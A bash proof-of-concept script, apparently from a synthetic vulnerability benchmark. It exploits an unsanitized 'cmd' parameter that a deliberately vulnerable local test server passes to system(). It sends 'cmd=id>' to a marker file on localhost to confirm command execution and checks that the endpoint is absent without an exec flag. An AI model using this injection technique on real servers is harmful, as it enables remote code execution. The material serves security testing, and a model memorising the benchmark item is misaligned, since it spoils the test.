#!/usr/bin/env bash
# PoC for 096_onion_C2I3S1
# Axes: C2 (two flags + struct) / I3 (struct dispatch then system()) / S1 (no sanitization)
#
# Usage: ./PoC.sh
# Expected: prints uid= line confirming RCE as the server process user.
#
# The patched binary (onion_server) lives in this directory. If absent, run:
#   cd $(dirname $0) && bash build.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/onion_server"
WWWROOT="/tmp/poc_096_www"
MARKER="/tmp/poc_096_marker"
PORT=18096

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# ── start server ───────────────────────────────────────────────────────────────
echo "[*] starting onion_server with --exec-mode --verbose on port $PORT..."
"$BINARY" --port "$PORT" --exec-mode --verbose --wwwroot "$WWWROOT" &
SERVER_PID=$!
sleep 0.5

# ── trigger ────────────────────────────────────────────────────────────────────
# I3: dispatch table selects path via 'type' parameter; cmd flows to system() unsanitized
# S1: no sanitization — any shell metacharacter works
echo "[*] sending payload: type=run&cmd=id>${MARKER}"
curl -sf "http://127.0.0.1:${PORT}/exec?type=run&cmd=id>${MARKER}" > /dev/null

# ── verify ─────────────────────────────────────────────────────────────────────
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# ── negative control: endpoint absent without --exec-mode ─────────────────────
echo "[*] verifying C2 gate: endpoint must be absent without --exec-mode..."
NEG_PORT=19096
"$BINARY" --port "$NEG_PORT" --wwwroot "$WWWROOT" &
SAFE_PID=$!
sleep 0.5
HTTP_CODE=$(curl -sf -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec?type=run&cmd=id" || true)
kill "$SAFE_PID" 2>/dev/null; wait "$SAFE_PID" 2>/dev/null || true
if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] gate check passed: got 404 without --exec-mode"
else
    echo "[!] gate check unexpected response: $HTTP_CODE"
fi
